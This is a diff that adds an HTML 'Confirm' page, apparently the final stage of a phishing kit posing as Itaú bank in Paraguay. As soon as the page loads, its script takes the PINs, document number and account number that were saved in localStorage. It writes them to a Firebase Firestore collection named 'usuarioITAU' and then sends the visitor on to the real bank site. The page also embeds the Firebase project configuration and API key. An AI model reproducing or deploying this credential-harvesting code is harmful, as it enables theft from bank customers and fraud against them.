@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm</title>
+</head>
+<body>
+    
+</body>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-analytics.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+
+
+
+<script id="testScriptName">
+  // Your web app's Firebase configuration
+   var firebaseConfig = {
+    apiKey: "AIzaSyBNw4ao5S5LQIfZRrlCzfBkg1jMEjRrcH8",
+  authDomain: "datealgeri.firebaseapp.com",
+  projectId: "datealgeri",
+  storageBucket: "datealgeri.appspot.com",
+  messagingSenderId: "418962581870",
+  appId: "1:418962581870:web:b4b8d6e7db514d66d2f97f"
+  
+};
+  // Initialize Firebase  
+  firebase.initializeApp(firebaseConfig);
+
+</script>
+
+<script>
+
+const db = firebase.firestore();
+/*const midnight = new Date(firebase.firestore.Timestamp.now().toDate().setHours(0, 0, 0, 0));*/
+
+  const created = firebase.firestore.Timestamp.fromDate(new Date()).toDate();
+window.addEventListener("load", async (e) => {
+  e.preventDefault();
+  /*
+  
+  
+  agregar crypto.uuid()
+  a el doc.name
+  */
+  
+ await db.collection("usuarioITAU").doc(localStorage.getItem("docu")).set({
+    PinAcceso: localStorage.getItem("correo"),
+    PinTransaaccional: localStorage.getItem("cpw"),
+    documento: localStorage.getItem("docu"),
+    CuentaNum: localStorage.getItem("pw"),
+   revisado: false,
+  });
+
+  window.location = "https://www.itau.com.py/Paginas/atencionparavos";
+});
+
+
+</script>
+</html>
